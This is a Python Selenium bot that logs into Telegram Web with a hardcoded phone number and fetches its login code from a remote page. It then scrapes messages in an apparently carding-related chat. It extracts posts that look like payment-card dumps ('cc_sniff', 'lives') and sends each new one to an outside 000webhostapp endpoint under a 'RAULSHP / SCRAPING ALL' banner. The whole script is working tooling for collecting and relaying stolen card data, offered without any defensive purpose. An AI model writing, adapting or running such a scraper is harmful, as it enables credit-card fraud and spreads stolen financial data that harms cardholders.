import re
from selenium import webdriver
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support.ui import Select
from selenium.webdriver.common.keys import Keys
import time
import requests

init()

options = webdriver.ChromeOptions()
options.add_argument("window-size=1200x1000")
options.add_argument("--log-level=3")
options.add_argument("--disable-extensions");
options.add_argument("test-type");
#options.add_argument('headless')
options.add_argument('--no-sandbox')
options.add_argument('--disable-dev-shm-usage')
options.add_argument("--disable-single-click-autofill");
options.add_argument("--disable-autofill-keyboard-accessory-view[8]");
options.add_experimental_option('excludeSwitches', ['enable-logging'])
driver = webdriver.Chrome(executable_path=r'C:\Program Files (x86)\chromedriver.exe', options=options)
#response = requests.get("https://geolocation-db.com/json/&position=true").json()


#print('[IP_INFO] => ',response['IPv4'],response['country_name'],response['city'],response['state'],response['postal'])
driver.get("https://web.telegram.org/k/")
time.sleep(2)
driver.find_element_by_xpath('//*[@id="auth-pages"]/div/div[2]/div[2]/div/div[2]/button').click()
time.sleep(3)


driver.find_element_by_name('phone').clear()
driver.find_element_by_name('phone').send_keys('+573203443445')
driver.find_element_by_xpath('//*[@id="auth-pages"]/div/div[2]/div[1]/div/div[3]/button[1]/div').click()
time.sleep(3)
validcode = True
while validcode == True:
  time.sleep(3)
  getcode = requests.get('https://osirischk2021.000webhostapp.com/bot/code.html').text
  if 'yes' in getcode:
    driver.find_element_by_xpath('//*[@id="auth-pages"]/div/div[2]/div[3]/div/div[3]/div/input').send_keys(getcode.replace(' yes',''),Keys.ENTER)
    print('login')
    validcode = False

time.sleep(2)
driver.find_element_by_xpath('//*[@id="column-left"]/div/div/div[1]/div[2]/input').send_keys('@Binsdailychat')
time.sleep(1)
driver.find_element_by_xpath('//*[@id="search-container"]/div[2]/div/div/div[1]/div/div[1]/ul/li/div[1]').click()


cc_cap = []
valid = True
while valid == True:
  try:
    readcc = driver.find_elements_by_xpath('//div[@class="bubble-content"]/div[@class="message"]')
    for sniff in readcc:
      cc_sniff = sniff.text
      validnum = ''
      numbers = re.findall(r'\d+', cc_sniff)
      for num in numbers:
        validnum = validnum + str(num)
      if len(validnum) >= 22:
        if '———»Details«———' in cc_sniff:
          #print('cc_sniff')
          try:
              subcadena = '———-»Info«-———-'#la subcadena que queremos localizar
              posicion = cc_sniff.index(subcadena)
              cadenita= cc_sniff[posicion:1000]
          except:
              print('')
          cc_capture = cc_sniff.replace(cadenita,'')
          if cc_capture in cc_cap:
            y=1
          else:
            cc_cap.append(cc_capture)
            requests.get('https://osirischk2021.000webhostapp.com/sniff/api.php?lives=<b>🦁 RAULSHP / SCRAPING ALL 🔰</b>'+"""

"""+cc_capture+"""

"""+'<b>[🦁💳🦾] / Bot By: @Raulshp</b>')
  except:
    y=1
